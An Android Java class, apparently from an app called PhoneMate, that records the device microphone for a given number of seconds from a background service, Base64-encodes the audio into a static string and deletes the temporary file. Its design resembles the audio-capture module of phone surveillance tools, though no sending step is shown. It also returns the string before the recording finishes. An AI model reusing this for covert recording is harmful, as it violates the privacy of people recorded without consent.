package com.dextrotechnologies.phonemate;

import android.media.MediaRecorder;
import android.util.Base64;
import android.util.Log;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.util.Timer;
import java.util.TimerTask;

public class MicMan {

    static MediaRecorder recorder;
    static File audiofile = null;
    static final String TAG = "MediaRecording";
    static TimerTask stopRecording;

    private static String recordedVoice = "";

    public static String RecordMic(int sec) {

        //Creating file
        File dir = MainService.getContextOfApplication().getCacheDir();
        try {
            Log.e("DIRR" , dir.getAbsolutePath());
            audiofile = File.createTempFile("sound", ".mp3", dir);
        } catch (IOException e) {
            Log.e(TAG, "external storage access error");
            return null;
        }


        //Creating MediaRecorder and specifying audio source, output format, encoder & output format
        recorder = new MediaRecorder();
        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        recorder.setOutputFile(audiofile.getAbsolutePath());
        try {
            recorder.prepare();
        } catch (IOException e) {
            e.printStackTrace();
        }
        recorder.start();

        stopRecording = new TimerTask() {
            @Override
            public void run() {
                //stopping recorder
                recorder.stop();
                recorder.release();
                sendVoice(audiofile);
                audiofile.delete();
            }
        };

        new Timer().schedule(stopRecording, sec*1000);

        return recordedVoice;
    }

    private static void sendVoice(File file) {

            InputStream inputStream = null;
            try {
                inputStream = new FileInputStream(file);
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            }

            long fileSize = file.length();
            byte[] allBytes = new byte[(int) fileSize];

            int bytesRead = 0;
            try {
                bytesRead = inputStream.read(allBytes);
            } catch (IOException e) {
                Log.e("FILEMSG", e.getMessage() );
            }

            recordedVoice = Base64.encodeToString(allBytes, Base64.DEFAULT);
    }
}
